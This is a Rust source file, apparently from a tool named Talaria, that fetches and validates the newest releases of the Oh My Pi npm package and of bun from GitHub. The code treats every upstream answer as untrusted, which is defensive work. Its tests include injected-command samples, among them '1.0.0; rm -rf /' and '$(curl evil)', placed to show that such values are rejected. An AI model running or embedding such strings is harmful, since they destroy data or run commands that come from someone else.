// THE CHECK — what each harness's upstream says its newest release is.
//
//   Oh My Pi   the npm registry's version document for the package
//              (`<registry>/@oh-my-pi%2fpi-coding-agent/latest`, or `/<v>`
//              for one release): its version, its `engines.bun`, and whether
//              npm marks it deprecated. One small document (~16 kB), never the
//              whole packument (~1 MB, every release ever).
//   bun        bun's GitHub releases (`<releases>/latest`, or
//              `/tags/bun-v<v>`): the tag, which must be `bun-v<x.y.z>`, and
//              neither a draft nor a prerelease. That is where mise, which
//              installs the harness's bun, downloads it from.
//
// Both bases are overridable for a mirror, a private registry, or a test stub
// (`TALARIA_HARNESS_NPM_REGISTRY`, `TALARIA_HARNESS_BUN_RELEASES`).
//
// EVERYTHING AN UPSTREAM ANSWERS IS UNTRUSTED. A version is kept only as a
// plain `x.y.z`; `engines.bun` only when it is short and made of the
// characters a range is written with; a deprecation note is capped and shown
// as text. Nothing here installs or runs anything: the install happens later,
// inside a workbench, through the same script every job's provisioning runs.

use serde_json::Value;
use talaria_workbench_harnesses::{OMP_PACKAGE, plain_version};

use crate::Tool;

/// The npm registry the check reads.
pub const NPM_REGISTRY_DEFAULT: &str = "https://registry.npmjs.org";
/// bun's GitHub releases.
pub const BUN_RELEASES_DEFAULT: &str = "https://api.github.com/repos/oven-sh/bun/releases";
/// An answer larger than this is refused unread.
const MAX_BODY: usize = 2 * 1024 * 1024;

fn env_or(var: &str, default: &str) -> String {
    std::env::var(var)
        .ok()
        .map(|v| v.trim().trim_end_matches('/').to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| default.to_string())
}

/// The npm registry base (`TALARIA_HARNESS_NPM_REGISTRY`).
pub fn npm_registry() -> String {
    env_or("TALARIA_HARNESS_NPM_REGISTRY", NPM_REGISTRY_DEFAULT)
}

/// bun's releases base (`TALARIA_HARNESS_BUN_RELEASES`).
pub fn bun_releases() -> String {
    env_or("TALARIA_HARNESS_BUN_RELEASES", BUN_RELEASES_DEFAULT)
}

/// One upstream release, as far as the channel trusts it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Release {
    pub version: String,
    /// Oh My Pi's `engines.bun` (a range), when it declares one.
    pub requires_bun: Option<String>,
    /// npm's deprecation message: a deprecated release is never adopted.
    pub deprecated: Option<String>,
}

/// The URL that answers `tool`'s release `version` (`None`: the newest).
pub fn url(tool: Tool, version: Option<&str>) -> String {
    match tool {
        Tool::Omp => format!(
            "{}/{}/{}",
            npm_registry(),
            OMP_PACKAGE.replace('/', "%2f"),
            version.unwrap_or("latest")
        ),
        Tool::Bun => match version {
            None => format!("{}/latest", bun_releases()),
            Some(v) => format!("{}/tags/bun-v{v}", bun_releases()),
        },
    }
}

fn short(s: &str, max: usize) -> String {
    s.chars().take(max).collect()
}

/// A range as npm writes one, and nothing else.
fn readable_range(r: &str) -> bool {
    !r.is_empty()
        && r.len() <= 100
        && r.chars()
            .all(|c| c.is_ascii_alphanumeric() || " .<>=^~|*-".contains(c))
}

/// npm's version document for Oh My Pi.
pub fn parse_npm(doc: &Value) -> Result<Release, String> {
    let name = doc.get("name").and_then(Value::as_str).unwrap_or("");
    if name != OMP_PACKAGE {
        return Err(format!(
            "the registry answered for {:?}, not {OMP_PACKAGE}",
            short(name, 80)
        ));
    }
    let version = doc.get("version").and_then(Value::as_str).unwrap_or("");
    if !plain_version(version) {
        return Err(format!(
            "the registry's version {:?} is not a plain release",
            short(version, 40)
        ));
    }
    let requires_bun = match doc.pointer("/engines/bun") {
        None | Some(Value::Null) => None,
        Some(Value::String(r)) if readable_range(r.trim()) => Some(r.trim().to_string()),
        // A floor Talaria cannot read is kept as unreadable: the planner
        // waits on it rather than guess (it would never satisfy).
        Some(other) => Some(format!("unreadable:{}", short(&other.to_string(), 60))),
    };
    let deprecated = match doc.get("deprecated") {
        Some(Value::String(d)) if !d.trim().is_empty() => Some(short(d.trim(), 200)),
        Some(Value::Bool(true)) => Some("deprecated".into()),
        _ => None,
    };
    Ok(Release {
        version: version.to_string(),
        requires_bun,
        deprecated,
    })
}

/// A GitHub release of bun.
pub fn parse_bun(doc: &Value) -> Result<Release, String> {
    let tag = doc.get("tag_name").and_then(Value::as_str).unwrap_or("");
    let Some(version) = tag.strip_prefix("bun-v").filter(|v| plain_version(v)) else {
        return Err(format!(
            "bun's release tag {:?} is not bun-v<x.y.z>",
            short(tag, 40)
        ));
    };
    let flag = |k: &str| doc.get(k).and_then(Value::as_bool).unwrap_or(false);
    let deprecated = if flag("draft") || flag("prerelease") {
        Some("a draft or prerelease on GitHub".into())
    } else {
        None
    };
    Ok(Release {
        version: version.to_string(),
        requires_bun: None,
        deprecated,
    })
}

/// Ask upstream for `tool`'s release `version` (`None`: the newest).
/// `Ok(None)` is an upstream that says there is no such release (404).
pub async fn fetch(tool: Tool, version: Option<&str>) -> Result<Option<Release>, String> {
    if let Some(v) = version
        && !plain_version(v)
    {
        return Err(format!("{:?} is not a plain release", short(v, 40)));
    }
    let url = url(tool, version);
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(20))
        .user_agent("talaria-workbench-harness-check")
        .build()
        .map_err(|e| format!("could not build the client: {e}"))?;
    let accept = match tool {
        Tool::Omp => "application/json",
        Tool::Bun => "application/vnd.github+json",
    };
    let resp = client
        .get(&url)
        .header("accept", accept)
        .send()
        .await
        .map_err(|e| format!("{url} did not answer: {e}"))?;
    let status = resp.status();
    if status == reqwest::StatusCode::NOT_FOUND {
        return Ok(None);
    }
    if !status.is_success() {
        return Err(format!("{url} answered {status}"));
    }
    let body = resp
        .bytes()
        .await
        .map_err(|e| format!("{url} broke off: {e}"))?;
    if body.len() > MAX_BODY {
        return Err(format!(
            "{url} answered {} bytes, more than a release document",
            body.len()
        ));
    }
    let doc: Value = serde_json::from_slice(&body)
        .map_err(|e| format!("{url} answered something other than JSON: {e}"))?;
    let rel = match tool {
        Tool::Omp => parse_npm(&doc)?,
        Tool::Bun => parse_bun(&doc)?,
    };
    if let Some(v) = version
        && rel.version != v
    {
        return Err(format!("{url} answered release {}, not {v}", rel.version));
    }
    Ok(Some(rel))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn npms_version_document_gives_the_release_its_bun_floor_and_any_deprecation() {
        let doc = json!({
            "name": OMP_PACKAGE, "version": "18.16.0",
            "engines": { "bun": ">=1.4.4" }, "dist": { "tarball": "x" },
        });
        assert_eq!(
            parse_npm(&doc),
            Ok(Release {
                version: "18.16.0".into(),
                requires_bun: Some(">=1.4.4".into()),
                deprecated: None
            })
        );
        let dep = json!({ "name": OMP_PACKAGE, "version": "18.13.3", "deprecated": "broken on bun 1.4.0" });
        assert_eq!(
            parse_npm(&dep).unwrap().deprecated.as_deref(),
            Some("broken on bun 1.4.0")
        );
        // Hostile or foreign answers are refused, never written into a script.
        assert!(parse_npm(&json!({ "name": "evil", "version": "1.0.0" })).is_err());
        assert!(parse_npm(&json!({ "name": OMP_PACKAGE, "version": "1.0.0; rm -rf /" })).is_err());
        let odd = json!({ "name": OMP_PACKAGE, "version": "1.0.0", "engines": { "bun": "$(curl evil)" } });
        assert!(
            parse_npm(&odd)
                .unwrap()
                .requires_bun
                .unwrap()
                .starts_with("unreadable:")
        );
    }

    #[test]
    fn a_bun_release_is_a_plain_tag_and_never_a_prerelease() {
        let doc = json!({ "tag_name": "bun-v1.4.4", "draft": false, "prerelease": false });
        assert_eq!(parse_bun(&doc).unwrap().version, "1.4.4");
        assert!(parse_bun(&doc).unwrap().deprecated.is_none());
        let pre = json!({ "tag_name": "bun-v1.5.0", "prerelease": true });
        assert!(parse_bun(&pre).unwrap().deprecated.is_some());
        assert!(parse_bun(&json!({ "tag_name": "canary" })).is_err());
        assert!(parse_bun(&json!({ "tag_name": "bun-v1.4" })).is_err());
    }

    #[test]
    fn the_urls_name_one_release_document_never_the_whole_packument() {
        assert_eq!(
            url(Tool::Omp, None),
            format!("{NPM_REGISTRY_DEFAULT}/@oh-my-pi%2fpi-coding-agent/latest")
        );
        assert!(url(Tool::Omp, Some("18.13.2")).ends_with("/@oh-my-pi%2fpi-coding-agent/18.13.2"));
        assert_eq!(
            url(Tool::Bun, None),
            format!("{BUN_RELEASES_DEFAULT}/latest")
        );
        assert!(url(Tool::Bun, Some("1.3.14")).ends_with("/tags/bun-v1.3.14"));
    }
}
